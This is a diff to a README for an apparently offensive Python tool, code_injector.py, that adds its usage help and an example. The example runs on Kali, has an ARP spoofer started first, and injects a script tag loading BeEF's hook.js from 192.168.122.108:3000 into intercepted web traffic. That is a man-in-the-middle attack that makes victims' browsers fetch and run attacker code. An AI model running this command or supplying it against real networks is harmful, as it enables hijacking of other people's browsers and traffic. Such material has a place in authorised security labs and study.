@@ -2,11 +2,21 @@
 
 ## Usage
 
+```shell
+usage: code_injector.py [-h] [-d DESTINATION] [-c CODE]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -d DESTINATION, --destination DESTINATION
+                        Destination (sslstrip, forward, local)
+  -c CODE, --code CODE  Code to inject
+```
 
 ### Example
 
+Using BeEF (start [ARPSpoofer](../arp_spoofer/arp_spoofer.py) first):
 ```shell
--c '<script src="http://<IP>:3000/hook.js"></script>'
+kali:~$ sudo python3 code_injector.py -d forward -c '<script src="http://192.168.122.108:3000/hook.js"></script>'
 ```
 
 ## Troubleshooting
